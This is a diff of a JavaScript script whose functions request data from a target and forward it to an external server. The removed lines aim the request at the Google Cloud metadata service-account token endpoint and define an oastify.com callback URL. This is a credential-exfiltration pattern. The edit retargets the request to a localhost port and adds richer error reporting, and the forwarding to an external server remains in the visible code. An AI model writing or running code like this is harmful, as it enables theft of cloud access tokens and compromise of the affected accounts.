@@ -8,11 +8,8 @@ function sendRequest() {
     var xhr = new XMLHttpRequest();
     
     // Define the URL for the local server
-    var localUrl = 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token';
+    var localUrl = 'http://127.0.0.1:8000';
     
-    // Define the URL for the external server
-    var externalUrl = 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com';
-
     // Configure it: GET-request for the URL
     xhr.open('GET', localUrl, true);
 
@@ -33,7 +30,7 @@ function sendRequest() {
     // Define what happens in case of error
     xhr.onerror = function (err) {
         console.error('Request failed');
-        sendPingWithError(err);
+        sendPingWithError(`Request to local server failed with error: ${err.type}`);
     };
 
     // Send the request to the local server
@@ -65,7 +62,7 @@ function sendToExternalServer(data) {
     // Define what happens in case of error
     xhr.onerror = function (err) {
         console.error('Request failed');
-        sendPingWithError(err);
+        sendPingWithError(`Request to external server failed with error: ${err.type}`);
     };
 
     // Send the request with the data
@@ -94,7 +91,7 @@ function sendPingWithError(errorMessage) {
     };
 
     // Define what happens in case of error
-    xhr.onerror = function () {
+    xhr.onerror = function (err) {
         console.error('Request failed');
     };
 
